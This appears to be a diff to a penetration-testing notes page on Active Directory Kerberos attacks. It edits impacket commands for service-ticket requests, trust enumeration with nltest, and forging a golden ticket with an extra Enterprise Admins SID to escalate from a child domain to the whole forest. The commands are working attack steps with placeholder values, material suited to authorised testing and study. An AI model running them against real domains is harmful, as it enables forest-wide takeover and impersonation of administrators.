@@ -178,6 +178,8 @@ This is all the possible services:
 </details>
 
 ```bash
+export KRB5CCNAME=$(pwd)/TGT_NAME.ccache
+
 impacket-getST -spn 'SERVICE/FQDN' -k -no-pass DOMAIN/USER_OF_THE_TGT -debug
 ```
 
@@ -220,29 +222,20 @@ impacket-psexec administrator@<DC_IP> -k -no-pass
 
 If we have a scenario where we are in a Child Domain and we have the privilege to force a Golden Ticket, we could use this technique to expand our privilege in entire Forest.
 
-### Get the Parent DC info
+### Find new Domain Trust
 
-To understand if we are under a Parent DC we can use the `impacket-GetADDomain` tool.
+To understand if we are under a Parent DC we can use this commands in CMD on a Domain Windows Machine.
 
-```bash
-impacket-GetADDomain CHILD-DOMAIN/user:pass -dc-ip <child_dc_ip>
-
-# output
-
+```powershell
+nltest /trusted_domains
+nltest /dclist:parent.com
 ```
-
-This returns:
-
-* Child domain name
-* Parent domain (if any)
-* Forest root
-* SID
 
 ### Golden Ticket for PrivEsc creation
 
 {% code overflow="wrap" %}
 ```bash
-impacket-ticketer -domain CHILD_DOMAIN -aesKey KRBTGT_AES_HASH -domain-sid CHILD_DOMAIN_SID -groups 519 -user-id USER_ID_TO_IMPERS -extra-sid PARENT_DOMAIN_SID 'usertoimpers'
+impacket-ticketer -domain CHILD_DOMAIN -aesKey KRBTGT_AES_HASH -domain-sid CHILD_DOMAIN_SID -groups 519 -user-id USER_ID_TO_IMPERS -extra-sid PARENT_DOMAIN_SID-USER_SID 'usertoimpers'
 ```
 {% endcode %}
 
